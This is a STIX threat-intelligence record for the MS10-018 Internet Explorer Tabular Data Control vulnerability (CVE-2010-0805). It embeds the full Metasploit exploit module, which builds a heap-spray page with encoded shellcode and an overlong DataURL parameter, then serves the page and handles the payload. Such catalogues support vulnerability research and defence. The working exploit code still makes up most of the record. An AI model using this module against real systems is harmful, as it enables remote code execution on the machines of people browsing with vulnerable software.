{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f768ded7-ffd4-45a8-a1e8-09831b90730e",
    "created": "2024-08-14T16:45:26.00996Z",
    "modified": "2024-08-14T16:45:26.009964Z",
    "name": "MS10-018 Microsoft Internet Explorer Tabular Data Control ActiveX Memory Corruption",
    "description": " This module exploits a memory corruption vulnerability in the Internet Explorer Tabular Data ActiveX Control. Microsoft reports that version 5.01 and 6 of Internet Explorer are vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_018_ie_tabular_activex.rb",
            "external_id": "ms10_018_ie_tabular_activex.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0805"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-018 Microsoft Internet Explorer Tabular Data Control ActiveX Memory Corruption',\n      'Description'    => %q{\n          This module exploits a memory corruption vulnerability in the Internet Explorer\n        Tabular Data ActiveX Control. Microsoft reports that version 5.01 and 6 of Internet\n        Explorer are vulnerable.\n\n        By specifying a long value as the \"DataURL\" parameter to this control, it is possible\n        to write a NUL byte outside the bounds of an array. By targeting control flow data\n        on the stack, an attacker can execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',  # original discovery\n          'jduck'     # metasploit version\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-0805' ],\n          [ 'OSVDB', '63329' ],\n          [ 'BID', '39025' ],\n          [ 'ZDI', '10-034' ],\n          [ 'MSB', 'MS10-018' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\", #\"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic (Heap Spray)',\n            {\n              'Ret' => 0x0c0c0c0c\n            }\n          ],\n        ],\n      'DisclosureDate' => '2010-03-09',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name} (target: #{target.name})\")\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Set the return\\nops\n    ret  \t    = Rex::Text.to_unescape([target.ret].pack('V'))\n\n    # ActiveX parameters\n    #progid =\n    clsid = \"333C7BC4-460F-11D0-BC04-0080C7055A83\"\n\n    # exploit url\n    url = \"http://\"\n    #url << rand_text_alphanumeric(258)\n    url << rand_text_alphanumeric(258+0x116+2)\n\n    # Construct the final page\n    var_unescape   = rand_text_alpha(rand(100) + 1)\n    var_shellcode  = rand_text_alpha(rand(100) + 1)\n    var_memory     = rand_text_alpha(rand(100) + 1)\n    var_spray      = rand_text_alpha(rand(100) + 1)\n    var_i          = rand_text_alpha(rand(100) + 1)\n\n    html = %Q|<html><body>\n<script>\nvar #{var_memory} = new Array();\nvar #{var_unescape} = unescape;\nvar #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');\nvar #{var_spray} = #{var_unescape}(\"#{ret * 2}\");\ndo { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0x4000 );\nfor (#{var_i} = 0; #{var_i} < 150; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};\n</script>\n<object classid='clsid:#{clsid}'>\n<param name='DataURL' value='#{url}'/>\n</object>\n</body></html>\n|\n\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-03-09",
    "x_mitre_platforms": [
        "win'"
    ]
}